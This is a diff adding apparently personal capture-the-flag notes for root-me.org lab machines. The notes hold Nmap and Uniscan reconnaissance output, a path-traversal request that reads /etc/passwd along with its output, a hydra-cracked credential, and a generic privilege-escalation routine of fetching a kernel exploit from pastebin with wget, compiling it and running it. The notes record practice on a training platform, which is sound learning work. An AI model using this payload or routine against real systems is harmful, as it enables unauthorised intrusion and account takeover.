@@ -1,0 +1,158 @@
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-25 22:17 MDT
+Warning: 212.129.28.18 giving up on port because retransmission cap hit (2).
+Nmap scan report for ctf01.root-me.org (212.129.28.18)
+Host is up (0.12s latency).
+Not shown: 990 closed ports
+PORT     STATE    SERVICE     VERSION
+22/tcp   open     ssh         OpenSSH 4.7 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 05:c3:aa:15:2b:57:c7:f4:2b:d3:41:1c:74:76:cd:3d (DSA)
+|_  2048 43:fa:3c:08:ab:e7:8b:39:c3:d6:f3:a4:54:19:fe:a6 (RSA)
+25/tcp   filtered smtp
+80/tcp   open     http        Apache httpd 2.2.6 ((Fedora))
+|_http-server-header: Apache/2.2.6 (Fedora)
+|_http-title: Phake Organization
+110/tcp  open     pop3        ipop3d 2006k.101
+|_pop3-capabilities: STLS TOP UIDL LOGIN-DELAY(180) USER
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-04-29T11:31:53
+|_Not valid after:  2010-04-29T11:31:53
+|_ssl-date: 2017-05-26T04:18:06+00:00; +1s from scanner time.
+111/tcp  open     rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/0  rpcbind
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          32768/udp  status
+|_  100024  1          51527/tcp  status
+139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
+143/tcp  open     imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)
+|_imap-capabilities: WITHIN SCAN IDLE IMAP4REV1 STARTTLSA0001 THREAD=ORDEREDSUBJECT THREAD=REFERENCES SASL-IR MAILBOX-REFERRALS CAPABILITY NAMESPACE MULTIAPPEND CHILDREN LOGIN-REFERRALS BINARY UNSELECT LITERAL+ OK SORT completed UIDPLUS ESEARCH
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-04-29T11:31:53
+|_Not valid after:  2010-04-29T11:31:53
+|_ssl-date: 2017-05-26T04:18:07+00:00; +1s from scanner time.
+445/tcp  open     netbios-ssn Samba smbd 3.0.26a-6.fc8 (workgroup: MYGROUP)
+901/tcp  open     http        Samba SWAT administration server
+| http-auth: 
+| HTTP/1.0 401 Authorization Required\x0D
+|_  Basic realm=SWAT
+|_http-title: 401 Authorization Required
+3306/tcp open     mysql       MySQL 5.0.45
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.0.45
+|   Thread ID: 5
+|   Capabilities flags: 41516
+|   Some Capabilities: SupportsCompression, SupportsTransactions, ConnectWithDatabase, LongColumnFlag, Speaks41ProtocolNew, Support41Auth
+|   Status: Autocommit
+|_  Salt: W+k]n5[LIiWV+oroS5Mb
+Device type: general purpose|printer|bridge
+Running (JUST GUESSING): QEMU (94%), GNU Hurd (87%), HP embedded (86%), Minolta embedded (86%), NEC embedded (86%), Oracle Virtualbox (85%), Linux (85%), Konica Minolta embedded (85%)
+OS CPE: cpe:/a:qemu:qemu cpe:/o:gnu:hurd cpe:/o:oracle:virtualbox cpe:/o:linux:linux_kernel:2.6.18 cpe:/h:konicaminolta:7035
+Aggressive OS guesses: QEMU user mode network gateway (94%), GNU Hurd 0.3 (87%), HP 9100c Digital Sender printer (J3113A) (86%), Minolta Di550 laser printer (86%), NEC SuperScript printer (86%), Oracle Virtualbox (85%), Linux 2.6.18 (CentOS 5, x86_64, SMP) (85%), Konica Minolta 7035 printer (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: 10.66.1.100
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.26a-6.fc8)
+|   Computer name: localhost
+|   NetBIOS computer name: 
+|   Domain name: localdomain
+|   FQDN: localhost.localdomain
+|_  System time: 2017-05-26T00:18:07-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server doesn't support SMBv2 protocol
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.98 ms 10.0.2.2
+2   1.24 ms ctf01.root-me.org (212.129.28.18)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
+uniscan -u ctf03.root-me.org -qweds:
+
+
+####################################
+# Uniscan project                  #
+# http://uniscan.sourceforge.net/  #
+####################################
+V. 6.3
+
+
+Scan date: 10-5-2017 21:53:53
+===================================================================================================
+| Domain: http://ctf03.root-me.org/
+| Server: Apache/2.2.6 (Fedora)
+| IP: 212.129.29.185
+===================================================================================================
+|
+| Directory check:
+| [+] CODE: 200 URL: http://ctf03.root-me.org/events/
+| [+] CODE: 200 URL: http://ctf03.root-me.org/icons/
+| [+] CODE: 200 URL: http://ctf03.root-me.org/inc/
+| [+] CODE: 200 URL: http://ctf03.root-me.org/list/
+| [+] CODE: 200 URL: http://ctf03.root-me.org/mail/
+| [+] CODE: 200 URL: http://ctf03.root-me.org/phpmyadmin/
+===================================================================================================
+|                                                                                                   
+| File check:
+| [+] CODE: 200 URL: http://ctf03.root-me.org/index.php
+| [+] CODE: 200 URL: http://ctf03.root-me.org/info.php
+| [+] CODE: 200 URL: http://ctf03.root-me.org/mail/src/read_body.php
+| [+] CODE: 200 URL: http://ctf03.root-me.org/squirrelmail/src/read_body.php
+===================================================================================================
+|
+| Check robots.txt:
+|
+| Check sitemap.xml:
+===================================================================================================
+|
+| Crawler Started:
+| Plugin name: Upload Form Detect v.1.1 Loaded.
+| Plugin name: Code Disclosure v.1.1 Loaded.
+| Plugin name: FCKeditor upload test v.1 Loaded.
+| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+| Plugin name: phpinfo() Disclosure v.1 Loaded.
+| Plugin name: External Host Detect v.1.2 Loaded.
+| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
+| Plugin name: E-mail Detection v.1.1 Loaded.
+
+http://ctf03.root-me.org/?page=../../../../etc/passwd%00:
+
+root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin .
+.
+.
+.
+
+patrick:x:500:500:Patrick Fair:/home/patrick:/bin/bash 
+jennifer:x:501:501:Jennifer Sea:/home/jennifer:/bin/bash 
+andy:x:502:502:Andrew Carp:/home/andy:/bin/bash 
+loren:x:503:503:Loren Felt:/home/loren:/bin/bash 
+amy:x:504:504:Amy Pendelton:/home/amy:/bin/bash 
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash 
+cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash 
+webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin 
+
+use hydra to bruteforce some passwords.
+
+username: amy
+password: dolphins
+
+I forgot to take notes about privesc but here it is:
+
+*find kernel release with uname -r
+*google for an appropriate exploit (fun part)
+*host exploit somehow (pastebin is easy and good)
+*wget exploit, or if that's not available then scp the file from your end
+*gcc -o exploit exploit.c or whatever
+*./exploit
+*profit (else, repeat from step 2, or edit exploit manually to fix errors)
